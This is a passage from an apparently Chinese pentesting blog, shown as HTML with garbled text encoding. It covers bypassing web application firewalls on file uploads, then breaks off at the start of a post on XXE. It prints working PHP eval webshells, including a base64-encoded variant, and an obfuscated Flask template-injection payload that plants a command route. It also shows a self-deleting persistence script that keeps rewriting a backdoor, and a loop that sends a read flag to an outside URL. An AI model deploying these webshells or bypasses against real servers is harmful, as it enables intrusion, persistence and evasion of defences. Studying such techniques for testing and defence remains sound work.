class="line">åˆ†å—ä¼ è¾“ï¼Œè„æ•°æ®ç­‰æˆåŠŸ</span><br></pre></td></tr></table></figure><h4 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h4><h5 id="wafæ£€æµ‹å†…å®¹"><a href="#wafæ£€æµ‹å†…å®¹" class="headerlink" title="wafæ£€æµ‹å†…å®¹"></a>wafæ£€æµ‹å†…å®¹</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¯·æ±‚çš„url</span><br><span class="line">Boundaryè¾¹ç•Œ</span><br><span class="line">MIMEç±»å‹</span><br><span class="line">æ–‡ä»¶åç¼€å</span><br><span class="line">æ–‡ä»¶å¤´</span><br><span class="line">æ–‡ä»¶å†…å®¹</span><br><span class="line">è®¿é—®æµé‡</span><br></pre></td></tr></table></figure><h5 id="æ–‡ä»¶ä¸Šä¼ æ•°æ®åŒ…"><a href="#æ–‡ä»¶ä¸Šä¼ æ•°æ®åŒ…" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ æ•°æ®åŒ…"></a>æ–‡ä»¶ä¸Šä¼ æ•°æ®åŒ…</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">    </span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9zWBDx6vAJHGTpAl</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary9zWBDx6vAJHGTpAl</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary9zWBDx6vAJHGTpAl</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">submit</span><br><span class="line">------WebKitFormBoundary9zWBDx6vAJHGTpAl--</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">boundary=----WebKitFormBoundary9zWBDx6vAJHGTpAl å®šä¹‰äº†BODYä¸­çš„åˆ†ç•Œçº¿(å› ä¸ºæ˜¯è°·æ­Œæµè§ˆå™¨ï¼Œæ‰€ä»¥åˆ†ç•Œçº¿ä¸º----WebKitFormBoundaryåŠ ä¸Šéšæœºå­—ç¬¦ä¸²)</span><br><span class="line"></span><br><span class="line">--boundary</span><br><span class="line"></span><br><span class="line">--boundary   <span class="comment"># æ¯ä¸¤ä¸ªåˆ†ç•Œçº¿ä¹‹é—´æ˜¯å…·ä½“çš„å†…å®¹ï¼šæ–‡ä»¶ä¸Šä¼ ï¼Œpostå‚æ•°</span></span><br><span class="line"></span><br><span class="line">--boundary--  <span class="comment"># ç»“æŸæ ‡å¿—</span></span><br></pre></td></tr></table></figure><h5 id="å®‰å…¨ğŸ•æµ‹è¯•"><a href="#å®‰å…¨ğŸ•æµ‹è¯•" class="headerlink" title="å®‰å…¨ğŸ•æµ‹è¯•"></a>å®‰å…¨ğŸ•æµ‹è¯•</h5><ul><li><p>ä¸å…è®¸phpåç¼€ä¸Šä¼ </p></li><li><p>ä¸Šä¼ æ—¶ï¼Œä¸æ£€æŸ¥æ–‡ä»¶å†…å®¹</p></li><li><p>è®¿é—®æ—¶ï¼Œä¸å…è®¸è®¿é—®å«æœ‰æ¶æ„å†…å®¹çš„phpæ–‡ä»¶</p></li></ul><h6 id="ç»•è¿‡åç¼€"><a href="#ç»•è¿‡åç¼€" class="headerlink" title="ç»•è¿‡åç¼€"></a>ç»•è¿‡åç¼€</h6><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Content-Type: multipart/form-data; boundary=a</span><br><span class="line"></span><br><span class="line">å¢åŠ å¤šä¸ªboundary</span><br><span class="line">phpï¼šå¯ä»¥åœ¨boundaryå‰åæ·»åŠ ä»»æ„å­—ç¬¦</span><br><span class="line">å¤§å°å†™</span><br><span class="line">boundary=boundary=a</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line"></span><br><span class="line">æ“ä½œï¼š</span><br><span class="line">å¤§å°å†™</span><br><span class="line">Content-Disposition ä»»æ„ä½ç½®æ¢è¡Œ,ç©ºæ ¼ï¼Œè„æ•°æ®æº¢å‡ºï¼Œå¤šä¸ªContent-Dispositionï¼Œform-dataï¼ˆåˆ é™¤ï¼Œæ”¹ä¸º*ï¼‰</span><br><span class="line">å¤šä¸ªfilenameï¼Œå¤šä¸ª;</span><br><span class="line">æ–‡ä»¶åå•åŒå¼•å·æ•°é‡</span><br><span class="line">content-typeï¼ˆå¢åˆ ï¼Œè®¾ç½®charsetï¼‰</span><br><span class="line">å¤šä¸ªBODY</span><br><span class="line">å¤šä¸ªboundary</span><br><span class="line">äº¤æ¢nameå’Œfilenameçš„é¡ºåº</span><br><span class="line">æ’åˆ—ç»„åˆ</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Accept-Encoding: </span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line">Accept-Encoding: compress</span><br><span class="line">Accept-Encoding: deflate</span><br><span class="line">Accept-Encoding: br</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">Accept-Encoding: *</span><br></pre></td></tr></table></figure><p>Windows</p><ul><li>NTFS æµ</li></ul><p>  <a href="https://learn.microsoft.com/zh-cn/windows/win32/fileio/file-streams">æ–‡ä»¶æµ (æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ) - Win32 apps | Microsoft Learn</a></p><p>  fuzzå¯ä»¥çš„</p>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">::$DATA</span><br><span class="line">::$INDEX_ALLOCATION</span><br></pre></td></tr></table></figure><p>  <img src="/../images/20171227163716-2507a226-eae1-1.png" alt="20171227163716-2507a226-eae1-1"></p><p>  <img src="/../images/image-20230517195752567.png" alt="image-20230517195752567"></p><ul><li><p>æ–‡ä»¶å</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">æ–‡ä»¶åå°¾åŠ ä»»æ„ä¸ª. æˆ–è€…ä»»æ„ä¸ªç©ºæ ¼ï¼ˆå¯¹æ–‡ä»¶åæ— å½±å“ï¼‰</span><br><span class="line"></span><br><span class="line">windowsæ–‡ä»¶åçš„ä¿ç•™å­—ç¬¦ï¼ˆä¸å…è®¸å‡ºç°ï¼‰</span><br><span class="line">\/:*?<span class="string">&quot; &lt;&gt;|</span></span><br><span class="line"><span class="string">å¯ä»¥å°è¯•åœ¨æ–‡ä»¶åååŠ ä¸Šè¿™äº›å­—ç¬¦</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å½“filename=shell.php:.jpg</span><br><span class="line">ç»“æœï¼š</span><br><span class="line">å¯ä»¥ä¸Šä¼ shell.phpï¼Œä½†æ˜¯ä¼šåƒæ‰æ–‡ä»¶å†…å®¹ã€‚ã€‚ã€‚</span><br><span class="line">å…¶ä»–çš„è¦ä¸ä¸å¯ä»¥ï¼Œå¯ä»¥çš„è¯ï¼Œä¸Šä¼ çš„æ–‡ä»¶åä¸º.jpg</span><br></pre></td></tr></table></figure></li></ul><p><img src="/../images/image-20230517155239619.png" alt="image-20230517155239619"></p><ul><li><p>æ–‡ä»¶åé•¿åº¦</p><p>æˆªæ–­è¶…é•¿æ–‡ä»¶å</p><p>windowsæ–‡ä»¶å</p><p><img src="/../images/image-20230618171438236.png" alt="image-20230618171438236"></p><p>linuxæ–‡ä»¶åï¼šlinuxä¸­æ–‡ä»¶åæœ€é•¿ä¸º255å­—ç¬¦ï¼Œæ–‡ä»¶è·¯å¾„æœ€å¤§é•¿åº¦ä¸º4096å­—ç¬¦</p><p>å¦‚æœåç«¯è„šæœ¬æ²¡æœ‰é™åˆ¶ä¸Šä¼ æ–‡ä»¶åé•¿åº¦ï¼Œå¯ä»¥é€šè¿‡å¤šæ¬¡æµ‹è¯•ï¼Œä¸Šä¼ åä¸ºaaaaaâ€¦(200+).php.jpgï¼ŒæŠŠæœ€åçš„.jpgæŒ¤å‡ºå»ã€‚</p></li></ul><p><strong>éƒ¨åˆ†æˆåŠŸçš„ï¼Œå¥½ç»•</strong></p><p>wafæ˜¯è§£ææœ€åä¸€ä¸ªå‚æ•°ï¼Œæœ€åä¸€ä¸ª;åé¢çš„ï¼Œä½†æ˜¯å¦‚æœæœ€åä¸€ä¸ªï¼›åé¢æ²¡æœ‰å‚æ•°ï¼Œ</p><p>åç«¯å°±å–å‰ä¸€ä¸ª,wafè¯†åˆ«åˆ°ç©º</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=shell.php;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230517144614924.png" alt="image-20230517144614924"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=<span class="string">&#x27;shell.php&#x27;</span>; <span class="comment"># åŒå¼•å·ä¸è¡Œ</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230517144541805.png" alt="image-20230517144541805"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>;filename=shell.php</span><br><span class="line"></span><br><span class="line">é™¤äº†shell.phpå¤„ï¼Œå…¶ä»–åœ°æ–¹åŠ æ¢è¡Œï¼Œæˆ–è„æ•°æ®éƒ½å¯</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230517145839048.png" alt="image-20230517145839048"></p><p>åˆ é™¤<code>content-type</code></p><p><img src="/../images/image-20230517153416749.png" alt="image-20230517153416749"></p><p>å¢åŠ <code>boundary</code></p><p><img src="/../images/image-20230517175433650.png" alt="image-20230517175433650"></p><p>å®‰å…¨ğŸ•+ä»£ç ç™½åå•ï¼ˆåç¼€åªå…è®¸å›¾ç‰‡ï¼‰</p><p>ä¸Šé¢ä»»æ„ä¸€ä¸ªç»•è¿‡ï¼ˆé™¤äº†ï¼›ç»•è¿‡ï¼‰+</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=shell.php::$DATA.jpg</span><br></pre></td></tr></table></figure><h6 id="ç»•è¿‡æ–‡ä»¶å†…å®¹æ£€æµ‹â€“å…æ€"><a href="#ç»•è¿‡æ–‡ä»¶å†…å®¹æ£€æµ‹â€“å…æ€" class="headerlink" title="ç»•è¿‡æ–‡ä»¶å†…å®¹æ£€æµ‹â€“å…æ€"></a>ç»•è¿‡æ–‡ä»¶å†…å®¹æ£€æµ‹â€“å…æ€</h6><p>å®‰å…¨ğŸ•çš„å†…å®¹æ£€æµ‹éšä¾¿æ”¹ä¸€ä¸‹å°±è¿‡äº†ã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="comment">// $cmd = base64_decode($_POST[1]);</span></span><br><span class="line"><span class="variable">$foo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h6 id="ç»•è¿‡æµé‡"><a href="#ç»•è¿‡æµé‡" class="headerlink" title="ç»•è¿‡æµé‡"></a>ç»•è¿‡æµé‡</h6><p>æµ‹è¯•æ—¶</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;xxx&quot;</span>) <span class="comment">#å‘½ä»¤æ‰§è¡Œé™åˆ¶</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230517211700124.png" alt="image-20230517211700124"></p><p>å¯¹æµé‡è¿›è¡Œä¸€ä¸ª<code>base64</code>åŠ å¯†å³å¯</p><p><code>webshell</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$cmd</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="variable">$foo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>èšå‰‘</p><p>ç¼–ç å™¨</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">data[pwd] = Buffer.<span class="keyword">from</span>(data[<span class="string">&#x27;_&#x27;</span>]).<span class="title function_ invoke__">toString</span>(<span class="string">&#x27;base64&#x27;</span>);</span><br></pre></td></tr></table></figure><p>é€‰æ‹©ç¼–ç å™¨</p><p><img src="/../images/image-20230517211627163.png" alt="image-20230517211627163"></p><h5 id="webshellå…æ€"><a href="#webshellå…æ€" class="headerlink" title="webshellå…æ€"></a>webshellå…æ€</h5><ul><li>wafæ£€æµ‹</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å†…å®¹ã€åˆ›å»ºæ—¥æœŸã€æ–‡ä»¶å¤§å°ã€é€šä¿¡æµé‡ç‰¹å¾</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¯¹äºé™æ€å¼•æ“çš„ç»•è¿‡ï¼Œå¯ä»¥é€šè¿‡æ‹†åˆ†å…³é”®è¯ã€</span><br><span class="line">åŠ å…¥èƒ½å¤Ÿå¼•å‘è§£æå¹²æ‰°çš„ç•¸å½¢å­—ç¬¦ç­‰;</span><br><span class="line"></span><br><span class="line">è€Œå¯¹äºåŠ¨æ€å¼•æ“ï¼Œéœ€è¦åˆ†æå®ƒè·Ÿè¸ªäº†å“ªäº›è¾“å…¥</span><br><span class="line">ç‚¹ï¼Œåˆæ˜¯å¦‚ä½•è·Ÿè¸ªå˜é‡çš„ï¼Œæœ€ç»ˆæ˜¯åœ¨å“ªäº›å‡½æ•°çš„å“ªäº›å‚æ•°å‘½ä¸­äº†æ¶æ„æ ·æœ¬è§„åˆ™</span><br></pre></td></tr></table></figure><p><a href="https://www.k0rz3n.com/2019/03/01/%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/">ç®€å•ç†è§£æ±¡ç‚¹åˆ†ææŠ€æœ¯ | K0rz3nâ€™s Blog</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¦ç±»çš„å…¥å£</span><br><span class="line">å„ç§æ··æ·†ï¼ˆç¼–ç åŠ å¯†ï¼Œè¿›åˆ¶è½¬æ¢ï¼Œååºåˆ—åŒ–...ï¼‰</span><br><span class="line">ç¬¦å·å¹²æ‰°ï¼Œç»•è¿‡æ­£åˆ™ï¼Œæ‹¼æ¥null,\n,\r,\tç­‰</span><br><span class="line">ä¿¡æ¯å·®ç»•è¿‡ï¼ˆåŠ å…¥å¤–éƒ¨å› ç´ åæ‰æ˜¯webshelï¼Œé‡å­WEBshellğŸ˜‹ï¼‰æ¯”å¦‚æˆªå–æ–‡ä»¶åï¼Œç›®å½•åï¼Œä¼ å…¥éšæœºæ•°ç§å­ç­‰</span><br></pre></td></tr></table></figure><ul><li>ä¼ ç»Ÿwebshell</li></ul><p>å­¦ä¹ ï¼š</p><p><a href="https://cloud.tencent.com/developer/article/1625439">WebShellé€šç”¨å…æ€çš„æ€è€ƒ - è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘</a></p><p><a href="https://github.com/LandGrey/webshell-detect-bypass/blob/master/docs/php-webshell-detect-bypass/php-webshell-detect-bypass.md">https://github.com/LandGrey/webshell-detect-bypass/blob/master/docs/php-webshell-detect-bypass/php-webshell-detect-bypass.md</a></p><p><a href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/webshell%E5%85%8D%E6%9D%80%E6%80%BB%E7%BB%93/">https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/webshell%E5%85%8D%E6%9D%80%E6%80%BB%E7%BB%93/</a></p><p>ä»£ç å®¡è®¡çŸ¥è¯†æ˜Ÿçƒ</p><p>æ”¶é›†ï¼š</p><p><a href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a></p><ul><li>æ— æ–‡ä»¶è½åœ°â€“å†…å­˜é©¬</li></ul><p>python</p><p><a href="https://xz.aliyun.com/t/10933#toc-4">https://xz.aliyun.com/t/10933#toc-4</a></p><p>é€šè¿‡æ³¨å†Œè·¯ç”±å¤„ç†æ¥å®ç°æ³¨å…¥</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># flask 1.x æ˜¯å¯ä»¥çš„</span></span><br><span class="line">?name=&#123;&#123;get_flashed_messages|attr(<span class="string">&quot;\x5f\x5fgetattribute\x5f\x5f&quot;</span>)(<span class="string">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>)|attr(<span class="string">&quot;\x5f\x5fgetattribute\x5f\x5f&quot;</span>)(<span class="string">&quot;\x5f\x5fgetitem\x5f\x5f&quot;</span>)(<span class="string">&quot;__builtins__&quot;</span>)|attr(<span class="string">&quot;\x5f\x5fgetattribute\x5f\x5f&quot;</span>)(<span class="string">&quot;\x5f\x5fgetitem\x5f\x5f&quot;</span>)(<span class="string">&quot;\u0065\u0076\u0061\u006c&quot;</span>)(<span class="string">&quot;app.add_ur&quot;</span>+<span class="string">&quot;l_rule(&#x27;/khaz&#x27;, &#x27;khaz&#x27;, la&quot;</span>+<span class="string">&quot;mbda :__imp&quot;</span>+<span class="string">&quot;ort__(&#x27;o&quot;</span>+<span class="string">&quot;s&#x27;).po&quot;</span>+<span class="string">&quot;pen(_request_c&quot;</span>+<span class="string">&quot;tx_stack.to&quot;</span>+<span class="string">&quot;p.re&quot;</span>+<span class="string">&quot;quest.args.get(&#x27;cmd&#x27;)).re&quot;</span>+<span class="string">&quot;ad())&quot;</span>,&#123;<span class="string">&#x27;\u005f\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u005f\u0063\u0074\u0078\u005f\u0073\u0074\u0061\u0063\u006b&#x27;</span>:get_flashed_messages|attr(<span class="string">&quot;\x5f\x5fgetattribute\x5f\x5f&quot;</span>)(<span class="string">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>)|attr(<span class="string">&quot;\x5f\x5fgetattribute\x5f\x5f&quot;</span>)(<span class="string">&quot;\x5f\x5fgetitem\x5f\x5f&quot;</span>)(<span class="string">&quot;\u005f\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u005f\u0063\u0074\u0078\u005f\u0073\u0074\u0061\u0063\u006b&quot;</span>),<span class="string">&#x27;app&#x27;</span>:get_flashed_messages|attr(<span class="string">&quot;\x5f\x5fgetattribute\x5f\x5f&quot;</span>)(<span class="string">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>)|attr(<span class="string">&quot;\x5f\x5fgetattribute\x5f\x5f&quot;</span>)(<span class="string">&quot;\x5f\x5fgetitem\x5f\x5f&quot;</span>)(<span class="string">&quot;\u0063\u0075\u0072\u0072\u0065\u006e\u0074\u005f\u0061\u0070\u0070&quot;</span>)&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">/khaz?cmd=whoami</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230531192216503.png" alt="image-20230531192216503"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åƒµå°¸è¿›ç¨‹ è®°å¾—ç¼–ç </span></span><br><span class="line">system(<span class="string">&quot;python3 -c \&quot;while 1:exec(\\\&quot;flag=__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()[:-1];print(flag);io=__import__(&#x27;requests&#x27;).get(&#x27;https://ctf.bugku.com/pvp/submit.html?token=67c0d48c49a89cc434b2f95da944e759&amp;flag=&#x27;+flag);print(io.content);__import__(&#x27;time&#x27;).sleep(600);\\\&quot;);\&quot; &amp; &quot;</span>);</span><br></pre></td></tr></table></figure><p>åƒµå°¸è¿›ç¨‹ ï¼š å­è¿›ç¨‹å…ˆäºçˆ¶è¿›ç¨‹é€€å‡ºï¼Œçˆ¶è¿›ç¨‹åˆæ²¡æœ‰å¤„ç†å­è¿›ç¨‹çš„é€€å‡ºçŠ¶æ€ï¼Œæ­¤æ—¶å­è¿›ç¨‹å°±ä¼šç§°ä¸ºåƒµå°¸è¿›ç¨‹ã€‚</p><p>çˆ¶è¿›ç¨‹é€šè¿‡<code>sleep(600)</code>ä¿è¯å­è¿›ç¨‹ä¼˜å…ˆäºçˆ¶è¿›ç¨‹é€€å‡º</p><p><a href="https://blog.csdn.net/Freshduke/article/details/111544319">(77æ¡æ¶ˆæ¯) pythonåƒµå°¸è¿›ç¨‹çš„äº§ç”Ÿå’Œåƒµå°¸è¿›ç¨‹è‡ªåŠ¨å¤„ç†_pipeå¯¼è‡´åƒµå°¸è¿›ç¨‹_Jimmy-TONGçš„åšå®¢-CSDNåšå®¢</a></p><p>php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="title function_ invoke__">ignore_user_abort</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="string">&#x27;&lt;?php @eval($_POST[&quot;123&quot;]) ?&gt;&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;snert.php&quot;</span>, <span class="variable">$content</span>);</span><br><span class="line">    <span class="title function_ invoke__">usleep</span>(<span class="number">10000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>é€šè¿‡å†…å­˜é©¬å¯åŠ¨ååˆ é™¤æ–‡ä»¶æœ¬èº«ä¹‹å‰ï¼Œä½¿ä»£ç åœ¨å†…å­˜ä¸­æ‰§è¡Œæ­»å¾ªç¯ï¼Œä½¿ç®¡ç†å‘˜æ— æ³•åˆ é™¤å†…å­˜é©¬ï¼Œè¾¾åˆ°æƒé™ç»´æŒçš„ç›®çš„ã€‚</p><p>JAVA</p><p>æ”¾åœ¨javaå®‰å…¨é‡Œå§</p><h5 id="æµé‡ç»•è¿‡"><a href="#æµé‡ç»•è¿‡" class="headerlink" title="æµé‡ç»•è¿‡"></a>æµé‡ç»•è¿‡</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¼±ç‰¹å¾ï¼šHTTP Header</span><br><span class="line">requestå’Œresponseå†…å®¹</span><br></pre></td></tr></table></figure><p>å‚è€ƒä¹‹å‰HWçœ‹çš„æ–‡ç« </p><ul><li><p>å“¥æ–¯æ‹‰</p><p><a href="https://www.freebuf.com/sectool/285693.html">ã€åŸåˆ›ã€‘å“¥æ–¯æ‹‰GodzillaåŠ å¯†æµé‡åˆ†æ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p></li><li><p>å†°è</p><p><a href="https://xz.aliyun.com/t/2744">åˆ©ç”¨åŠ¨æ€äºŒè¿›åˆ¶åŠ å¯†å®ç°æ–°å‹ä¸€å¥è¯æœ¨é©¬ä¹‹Javaç¯‡ - å…ˆçŸ¥ç¤¾åŒº</a></p><p><a href="https://www.secpulse.com/archives/195173.html">å†°èV4.0æµé‡åˆ†æåˆ°æ”»é˜²æ£€æµ‹ - SecPulse.COM | å®‰å…¨è„‰æ</a></p><p><a href="https://xz.aliyun.com/t/12453">å†°è4.0è‡ªå®šä¹‰åŠ å¯† - å…ˆçŸ¥ç¤¾åŒº</a></p></li><li><p>èšå‰‘</p><p><a href="https://www.yuque.com/antswordproject/antsword/yuakxl">https://www.yuque.com/antswordproject/antsword/yuakxl</a></p></li></ul><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><a href="https://xz.aliyun.com/t/368">https://xz.aliyun.com/t/368</a></p><p><a href="https://xz.aliyun.com/t/10515">https://xz.aliyun.com/t/10515</a></p><p>[Bypass WAF Cookbook - MayIKissYou](<a href="https://wooyun.js.org/drops/Bypass">https://wooyun.js.org/drops/Bypass</a> WAF Cookbook.html)</p><p><a href="https://www.anquanke.com/post/id/203880">https://www.anquanke.com/post/id/203880</a></p><p><a href="https://xz.aliyun.com/t/11607#toc-1">ç„æ­¦ç›¾çš„å‡ ç§ç»•è¿‡å§¿åŠ¿ - å…ˆçŸ¥ç¤¾åŒº</a></p><h2 id="å¥½æ–‡æ”¶é›†"><a href="#å¥½æ–‡æ”¶é›†" class="headerlink" title="å¥½æ–‡æ”¶é›†"></a>å¥½æ–‡æ”¶é›†</h2><p><a href="https://xz.aliyun.com/t/12089">è®°ä¸€æ¬¡é˜¿é‡Œäº‘ä¼é­”å¼•æ“-å¤šåŠŸèƒ½åœºæ™¯ç»•è¿‡æµ‹è¯• - å…ˆçŸ¥ç¤¾åŒº</a></p><p><a href="https://mp.weixin.qq.com/s/wvKfe4xxNXWEgtQE4PdTaQ">Javaååºåˆ—åŒ–æ•°æ®ç»•WAFä¹‹åŠ å¤§é‡è„æ•°æ®</a></p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>XXE</title>
      <link href="/2023/06/01/XXE/"/>
      <url>/2023/06/01/XXE/</url>
      
        <content type="html"><![CDATA[<h1 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h1><h2 id="åŸºç¡€"><a href="#åŸºç¡€" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h2><ol><li><p>å®šä¹‰</p><blockquote><p>XMLæ˜¯å¯æ‰©å±•æ ‡è®°è¯­è¨€ï¼ˆeXtensible Markup Languageï¼‰çš„ç¼©å†™ï¼Œå®ƒæ˜¯æ˜¯ä¸€ç§æ•°æ®è¡¨ç¤ºæ ¼å¼ï¼Œå¯ä»¥æè¿°éå¸¸ å¤æ‚çš„æ•°æ®ç»“æ„ï¼Œå¸¸ç”¨äºä¼ è¾“å’Œå­˜å‚¨æ•°æ®ã€‚</p></blockquote></li><li><p>ä¸htmlçš„è”ç³»å’ŒåŒºåˆ«</p><ul><li>HTML è¢«è®¾è®¡ç”¨æ¥æ˜¾ç¤ºæ•°æ®</li><li>XML è¢«è®¾è®¡ç”¨æ¥ä¼ è¾“å’Œå­˜å‚¨æ•°æ®</li></ul><blockquote><p>å¯¹ XML æœ€å¥½çš„æè¿°æ˜¯ï¼š</p><p><strong>XML æ˜¯ç‹¬ç«‹äºè½¯ä»¶å’Œç¡¬ä»¶çš„ä¿¡æ¯ä¼ è¾“å·¥å…·ã€‚</strong></p></blockquote></li><li><p>è¯­æ³•</p><p><img src="/../images/image-20220804165043284-1686034515882.png" alt="image-20220804165043284"></p></li><li><p>æ ¼å¼</p><ul><li><p>XMLå£°æ˜ï¼šç‰ˆæœ¬ï¼Œç¼–ç ä¿¡æ¯ï¼ˆå¯é€‰ï¼Œå¦‚æœå­˜åœ¨å°±å¿…é¡»æ”¾åœ¨æ–‡æ¡£çš„é¦–è¡Œï¼‰</p></li><li><p>DTD:Document Type Definition å³æ–‡æ¡£ç±»å‹å®šä¹‰ (å¯é€‰)</p></li><li><p>æ–‡æ¡£å…ƒç´ </p></li><li><p>å…¸å‹xmlæ–‡æ¡£ä¾‹å­</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span> <span class="comment">&lt;!--XMLå£°æ˜--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--DTDï¼Œè¿™éƒ¨åˆ†å¯é€‰çš„--&gt;</span>          </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span 